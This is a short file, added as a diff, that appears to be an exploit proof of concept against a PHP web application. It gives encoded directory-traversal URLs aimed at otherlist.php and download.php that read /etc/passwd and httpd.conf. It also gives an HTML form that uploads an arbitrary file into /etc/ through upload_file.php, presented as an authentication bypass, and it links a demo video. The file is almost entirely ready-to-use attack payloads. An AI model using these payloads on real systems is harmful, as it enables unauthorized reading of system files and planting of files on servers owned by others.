@@ -1,0 +1,26 @@
+Directory traversal:
+ 
+http://www.example.com/otherlist.php?dir=/%2f../%2f../etc/passwd
+http://www.example.com/otherlist.php?dir=/%2f../%2f../etc/httpd.conf
+ 
+ 
+ 
+ 
+Authentication bypass:
+ 
+http://www.example.com/download.php?dir=/%2f../%2f../etc/&file=passwd
+http://www.example.com/download.php?dir=/%2f../%2f../etc/&file=httpd.conf
+ 
+ 
+ 
+Authentication bypass - upload file:
+ 
+<form id="form1" name="write_form" action="http://www.example.com/upload_file.php?dir=/%2f../%2f../etc/" method="post" enctype="multipart/form-data">
+    <INPUT TYPE=FILE name="Filedata" id="Filedata">
+    <input type=submit>
+</form>
+ 
+ 
+ 
+DEMO video:
+http://www.youtube.com/watch?v=QZtiuYyA8XU
